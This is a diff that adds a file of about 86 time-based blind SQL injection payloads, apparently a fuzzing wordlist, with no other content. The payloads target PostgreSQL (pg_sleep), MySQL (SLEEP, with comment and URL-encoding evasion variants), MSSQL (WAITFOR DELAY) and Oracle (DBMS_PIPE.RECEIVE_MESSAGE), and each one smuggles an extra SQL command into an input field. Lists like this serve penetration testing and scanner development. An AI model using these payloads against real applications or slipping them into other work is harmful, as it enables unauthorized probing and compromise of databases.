@@ -1,0 +1,86 @@
+' || pg_sleep(10)--
+' AND 1=(SELECT 1 FROM pg_sleep(10))--
+' OR 1=(SELECT 1 FROM pg_sleep(10))--
+' || CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) IS NOT NULL--
+'; SELECT pg_sleep(10);--
+1; SELECT pg_sleep(10)--
+' AND (SELECT COUNT(*) FROM pg_sleep(10))>0--
+'' || pg_sleep(10)--
+'||pg_sleep(10)::text--
+' AND (pg_sleep(10)) IS NOT NULL--
+' OR (pg_sleep(10)) IS NOT NULL--
+0 || pg_sleep(10)--
+0; SELECT pg_sleep(10)--
+') || pg_sleep(10)--
+')) || pg_sleep(10)--
+') AND (SELECT 1 FROM pg_sleep(10))=1--
+')); SELECT pg_sleep(10);--
+'||pg_sleep(10)--
+'||(pg_sleep(10))--
+"||pg_sleep(10)--
+' OR SLEEP(10)--
+' AND SLEEP(10)--
+' AND IF(1=1, SLEEP(10), 0)--
+' OR IF(1=1, SLEEP(10), 0)--
+' AND (CASE WHEN (1=1) THEN SLEEP(10) ELSE 0 END)--
+' OR (CASE WHEN (1=1) THEN SLEEP(10) ELSE 0 END)--
+1' AND SLEEP(10) AND '1'='1
+1' OR SLEEP(10) OR '1'='1
+') OR SLEEP(10)--
+')) OR SLEEP(10)--
+' AND (SELECT 1 FROM (SELECT SLEEP(10)) t)--
+' OR (SELECT 1 FROM (SELECT SLEEP(10)) t)--
+0 OR SLEEP(10)--
+0 AND SLEEP(10)--
+1 OR SLEEP(10)--
+') AND SLEEP(10)--
+') AND IF(1=1,SLEEP(10),0)--
+')) AND SLEEP(10)--
+')) AND IF(1=1,SLEEP(10),0)--
+')); AND SLEEP(10)--
+'/**/AND/**/SLEEP(10)--
+'AND(SLEEP(10))--
+'OR(SLEEP(10))--
+'/*!AND*/SLEEP(10)--
+'/*!50000AND*/SLEEP(10)--
+" OR SLEEP(10)--
+" AND SLEEP(10)--
+" AND IF(1=1,SLEEP(10),0)--
+` OR SLEEP(10)--
+'%20AND%20SLEEP(10)--
+'%20OR%20SLEEP(10)--
+'%0aAND%0aSLEEP(10)--
+'%0d%0aAND%0d%0aSLEEP(10)--
+'; WAITFOR DELAY '0:0:10'--
+' WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+' AND 1=1; WAITFOR DELAY '0:0:10'--
+1; WAITFOR DELAY '0:0:10'--
+') WAITFOR DELAY '0:0:10'--
+')); WAITFOR DELAY '0:0:10'--
+')) AND 1=1; WAITFOR DELAY '0:0:10'--
+0; WAITFOR DELAY '0:0:10'--
+1 WAITFOR DELAY '0:0:10'--
+'/**/WAITFOR/**/DELAY/**/'0:0:10'--
+"; WAITFOR DELAY '0:0:10'--
+" WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'; --
+'; IF (2>1) WAITFOR DELAY '0:0:10'--
+'; IF ('a'='a') WAITFOR DELAY '0:0:10'--
+' || DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)--
+' OR 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)--
+'||(SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) FROM dual)--
+' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) FROM dual) IS NOT NULL--
+') || DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)--
+')) || DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)--
+0 || DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)--
+' AND (SELECT 1 FROM dual WHERE 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)=1) IS NOT NULL--
+' OR 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) FROM dual)--
+" || DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)--
+test') OR SLEEP(10)--
+test%') OR SLEEP(10)--
+1 OR SLEEP(10)--
+-1 OR SLEEP(10)--
+1; SELECT pg_sleep(10)--
